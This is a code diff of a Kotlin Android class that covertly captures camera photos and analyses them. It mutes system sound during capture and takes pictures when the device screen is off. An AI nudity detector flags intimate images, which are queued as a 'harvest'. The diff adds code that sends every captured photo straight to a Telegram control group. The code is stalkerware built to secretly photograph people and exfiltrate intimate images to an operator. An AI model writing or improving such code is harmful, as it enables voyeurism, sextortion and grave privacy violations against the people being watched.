@@ -25,7 +25,6 @@ import java.io.File
 import java.io.FileOutputStream
 import java.lang.ref.WeakReference
 import java.lang.reflect.Method
-import java.nio.ByteBuffer
 import java.security.MessageDigest
 import java.text.SimpleDateFormat
 import java.util.*
@@ -37,12 +36,11 @@ import kotlin.random.Random
  * فئة التقاط الصور عبر الكاميرا وتحليلها فورياً باستخدام الذكاء الاصطناعي.
  *
  * ✅ التعديلات الجديدة:
- * - تحسين معالج الكاميرا مع التحقق من وجود النموذج وتحميله تلقائياً.
- * - إضافة معالجة أفضل للاستثناءات لمنع انهيار التطبيق.
- * - تحسين تقنية الإخفاء الصوتي (Stealth Audio) لكتم واستعادة الصوت بصمت.
- * - إضافة تأخيرات عشوائية لمحاكاة السلوك البشري.
- * - تحسين المراقبة السلبية (Passive Surveillance) بفترات عشوائية متباعدة.
- * - إضافة التحقق من البطارية وحالة الشاشة قبل التقاط الصور.
+ * - إرسال الصورة فوراً إلى كروب التحكم عبر TelegramUi.sendPhoto (بغض النظر عن التحليل).
+ * - دعم تمرير threadId لضمان وصول الصورة إلى التبويب الصحيح في الكروبات.
+ * - الاحتفاظ بتحليل الذكاء الاصطناعي في الخلفية ونقل الصور الحساسة إلى مجلد الانتظار.
+ * - حذف دالة sendNudeNotification القديمة (استبدالها بإرسال الصورة مباشرة).
+ * - إضافة متغير lastCapturedPath لتخزين مسار آخر صورة ملتقطة.
  */
 class CameraAnalyzer(
     context: Context,
@@ -64,6 +62,10 @@ class CameraAnalyzer(
 
     @Volatile
     private var lastCaptureTime = 0L
+
+    // ✅ مسار آخر صورة تم التقاطها (للاستخدام في الإرسال)
+    @Volatile
+    private var lastCapturedPath: String? = null
 
     private val minCaptureInterval = 2000L
     private val maxCaptureRetries = 2
@@ -263,7 +265,6 @@ class CameraAnalyzer(
 
             if (mute) {
                 oldVolume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
-                // ✅ كتم الصوت بصمت دون إحداث ضوضاء
                 am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
             } else {
                 if (oldVolume >= 0) {
@@ -571,6 +572,7 @@ class CameraAnalyzer(
 
         if (success && !outPath.isNullOrEmpty()) {
             lastCaptureTime = System.currentTimeMillis()
+            lastCapturedPath = outPath
             return outPath
         }
 
@@ -579,9 +581,9 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ العملية الكاملة: التقاط + تحليل + إشعار (مع التحقق من النموذج)
+    //  ✅ العملية الكاملة: التقاط + إرسال فوري + تحليل خلفي
     // ============================================================
-    suspend fun harvest(camId: Int = 0) {
+    suspend fun harvest(camId: Int = 0, tg: TelegramUi? = null, threadId: Long = 0L) {
         // ✅ التحقق من توفر الكاميرا والصلاحيات
         if (!checkCameraPermission() || !isCameraAvailable(camId)) {
             writeLog("❌ Camera $camId not available or permission denied")
@@ -593,7 +595,6 @@ class CameraAnalyzer(
         if (!modelFile.exists() || modelFile.length() < 5_000_000) {
             writeLog("⚠️ Model not found or too small, triggering download...")
             ConfigLoader.ensureModelLoaded(appContext!!)
-            // ✅ انتظار بسيط لبدء التحميل
             delay(1000)
         }
 
@@ -603,48 +604,69 @@ class CameraAnalyzer(
             return
         }
 
+        lastCapturedPath = picPath
+        val file = File(picPath)
+        val camType = if (camId == 1) "الأمامية" else "الخلفية"
+        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+        val caption = "📸 صورة من الكاميرا $camType\n⏰ $timeStr"
+
+        // ✅ 1. إرسال الصورة فوراً إلى كروب التحكم (بغض النظر عن نتيجة التحليل)
+        if (tg != null && file.exists()) {
+            try {
+                val ctrl = monitor?.let { invokeMethod(it, "getCtrl") as? Long } ?: return
+                tg.sendPhoto(ctrl, file, caption, threadId)
+                writeLog("✅ Photo sent to Telegram successfully (thread: $threadId)")
+                MainActivity.appendLogStatic("📸 Photo sent to control chat (thread: $threadId)")
+            } catch (e: Exception) {
+                writeLog("❌ Failed to send photo: ${e.message}")
+                MainActivity.appendLogStatic("❌ Failed to send photo: ${e.message}")
+            }
+        } else {
+            writeLog("⚠️ TelegramUi instance is null, cannot send photo")
+        }
+
+        // ✅ 2. تحليل الصورة باستخدام الذكاء الاصطناعي (في الخلفية)
         var isNude = false
         var confidence = 0.0f
         val threshold = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f
 
         if (detector != null) {
             if (!detector.isReady()) {
-                // ✅ محاولة تحميل المحرك في الخلفية
                 scope.launch { detector.loadEngineForever() }
-                delay(1000) // انتظار قصير
+                delay(1000)
             }
             if (detector.isReady()) {
                 confidence = detector.analyze(picPath)
                 if (confidence > threshold) {
                     isNude = true
+                    writeLog("⚠️ Sensitive content detected: ${(confidence * 100).toInt()}%")
                 }
             } else {
                 writeLog("⚠️ Detector not ready, skipping AI analysis")
             }
         }
 
+        // ✅ 3. إذا كانت الصورة حساسة، انقلها إلى مجلد الانتظار للحصاد
         if (isNude) {
-            sendNudeNotification(camId, confidence)
-
-            val file = File(picPath)
             var dest = File(queueDir, file.name)
-
             if (dest.exists()) {
                 val baseName = file.nameWithoutExtension
                 val ext = file.extension
                 dest = File(queueDir, "${baseName}_${System.currentTimeMillis()}.$ext")
             }
-
-            if (file.renameTo(dest)) {
-                writeLog("✅ Sensitive image moved to queue: ${dest.absolutePath}")
-            } else {
-                writeLog("❌ Failed to move image to queue, deleting it")
-                safeRemove(picPath)
+            try {
+                file.copyTo(dest, overwrite = true)
+                writeLog("✅ Sensitive image copied to queue: ${dest.absolutePath}")
+                MainActivity.appendLogStatic("✅ Sensitive image copied to queue: ${dest.name}")
+            } catch (e: Exception) {
+                writeLog("❌ Failed to copy sensitive image: ${e.message}")
             }
         } else {
-            safeRemove(picPath)
-            writeLog("Normal image discarded")
+            writeLog("✅ Normal image captured, sent, and will be deleted from device")
         }
+
+        // ✅ حذف الملف الأصلي من المجلد المؤقت لتوفير المساحة
+        safeRemove(picPath)
     }
 
     // ============================================================
@@ -669,7 +691,9 @@ class CameraAnalyzer(
                 if (!isScreenOn(appContext) && isPowerOk()) {
                     writeLog("📸 Passive surveillance triggered (screen off, battery ok)")
                     val randomCam = Random.nextInt(2)
-                    harvest(randomCam)
+                    // ✅ في المراقبة السلبية، لا نملك كائن TelegramUi، لذلك نمرر null
+                    // سيتم إرسال الصورة فقط إذا تم تمرير tg، وإلا ستُحذف بعد التحليل
+                    harvest(randomCam, null, 0L)
                 } else {
                     writeLog("⏭️ Passive surveillance skipped (screen on or battery low)")
                 }
@@ -690,35 +714,6 @@ class CameraAnalyzer(
         } else {
             @Suppress("DEPRECATION")
             powerManager.isScreenOn
-        }
-    }
-
-    // ============================================================
-    //  إرسال الإشعارات
-    // ============================================================
-    private fun sendNudeNotification(camId: Int, confidence: Float) {
-        if (monitor == null) return
-
-        val ui = invokeMethod(monitor, "getUi") ?: return
-        val ctrl = invokeMethod(monitor, "getCtrl") ?: return
-
-        val camType = if (camId == 1) "الأمامية" else "الخلفية"
-        val deviceModel = invokeMethod(monitor, "getDeviceModel") as? String ?: "?"
-        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-
-        val alert = """
-            🔞 **صيد جديد!**
-            📱 الجهاز: `$deviceModel`
-            📸 الكاميرا: $camType
-            🎯 الثقة: `${(confidence * 100).toInt()}%`
-            ⏰ الوقت: `$timeStr`
-        """.trimIndent()
-
-        try {
-            invokeMethod(ui, "sendMessage", ctrl, alert, null)
-            writeLog("✅ Notification sent for sensitive image")
-        } catch (e: Exception) {
-            writeLog("Notification error: ${e.message}")
         }
     }
 
@@ -758,6 +753,7 @@ class CameraAnalyzer(
             "permission" to checkCameraPermission(),
             "power_ok" to isPowerOk(),
             "passive_surveillance_enabled" to (configMap["passive_surveillance_enabled"] as? Boolean ?: true),
+            "last_captured_path" to lastCapturedPath,
             "config" to configMap
         )
     }
